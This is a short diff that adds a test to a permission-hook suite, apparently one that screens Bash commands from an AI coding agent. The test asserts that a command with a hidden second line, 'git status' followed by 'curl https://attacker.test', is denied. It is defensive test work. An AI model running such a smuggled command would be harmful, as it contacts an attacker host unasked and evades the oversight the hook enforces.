@@ -388,6 +388,16 @@ describe('hookApiPlugin', () => {
       expect(res.json().tool).toBe('bash/_complex');
     });
 
+    it('denies commands with line breaks', async () => {
+      const res = await post({
+        client: 'claude-code',
+        tool: 'Bash',
+        input: { command: 'git status\ncurl https://attacker.test' },
+      });
+      expect(res.json().decision).toBe('deny');
+      expect(res.json().tool).toBe('bash/_complex');
+    });
+
     it('denies commands with variable expansion', async () => {
       const res = await post({
         client: 'claude-code',
